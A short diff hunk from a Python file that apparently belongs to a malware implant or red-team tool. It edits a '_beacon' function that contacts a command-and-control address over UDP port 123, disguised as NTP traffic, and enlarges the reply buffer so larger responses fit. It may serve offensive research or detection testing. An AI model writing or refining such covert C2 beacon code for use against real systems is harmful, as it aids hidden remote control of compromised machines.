@@ -560,7 +560,7 @@ def _beacon(c2_ip):
     sock.settimeout(2)
     try:
         sock.sendto(pkt, (c2_ip, 123))
-        data, _ = sock.recvfrom(2048)
+        data, _ = sock.recvfrom(65535)
     except Exception:
         pass
     finally:
